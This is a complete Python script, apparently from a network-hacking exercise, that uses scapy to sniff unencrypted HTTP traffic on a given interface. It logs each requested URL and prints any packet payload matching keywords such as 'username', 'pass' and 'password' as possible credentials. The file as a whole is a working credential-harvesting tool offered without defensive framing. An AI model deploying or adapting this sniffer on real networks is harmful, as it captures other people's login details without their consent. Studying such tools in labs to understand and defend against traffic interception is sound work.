import scapy.all as scapy
from scapy.layers import http
import argparse


def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', '--interface', dest = 'userinterface', help = 'Enter Interface you want to sniff traffic on!')
    options = parser.parse_args()
    return options.userinterface 

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet) 


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login(packet):
    if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load.decode() #Python 3 has a issue with using string and bytes in a single print statement so I had to turn this into a string so we can use it later on 
            keywords = ['login', 'uname', 'username', 'Username', 'User', 'user', 'Password', 'password', 'pass', 'Pass']
            for keyword in keywords: 
                if keyword in load: #Uses words in list to check if a matching word is in a packet. 
                   return load 

def process_sniffed_packet(packet):
    #Filter, modify packet
    if packet.haslayer(http.HTTPRequest): #Filters by http data Scapy does not have http filter by default so we must use the http module
        url = get_url(packet)
        print("[*] HTTP Request >>" ,url.decode())

        login_info = get_login(packet)
        if login_info:
             print("\n\n[*] Possible usernames/passwords >> ", login_info, '\n\n')


try:
    interface = get_args()
    sniff(interface)
    
except: 
    print("\n\n[?] An error has occured...\n[?] Please open the help menu or.... \n[?] Please check if you have the correct interface name!")